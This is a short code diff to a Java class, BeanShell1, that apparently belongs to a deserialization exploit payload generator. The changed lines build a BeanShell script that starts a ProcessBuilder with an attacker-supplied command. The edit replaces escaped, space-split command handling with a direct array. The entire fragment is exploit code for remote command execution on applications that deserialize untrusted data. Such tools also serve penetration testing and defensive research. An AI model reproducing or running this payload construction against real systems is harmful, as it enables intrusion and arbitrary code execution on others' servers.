@@ -30,7 +30,7 @@ public class BeanShell1 extends PayloadRunner implements ObjectPayload<PriorityQ
         String payload =
             "compare(Object foo, Object bar) {new java.lang.ProcessBuilder(new String[]{" +
                 Strings.join( // does not support spaces in quotes
-                    Arrays.asList(command[0].replaceAll("\\\\","\\\\\\\\").replaceAll("\"","\\\"").split(" ")),
+                    Arrays.asList(command),
                     ",", "\"", "\"") +
                 "}).start();return new Integer(1);}";
 
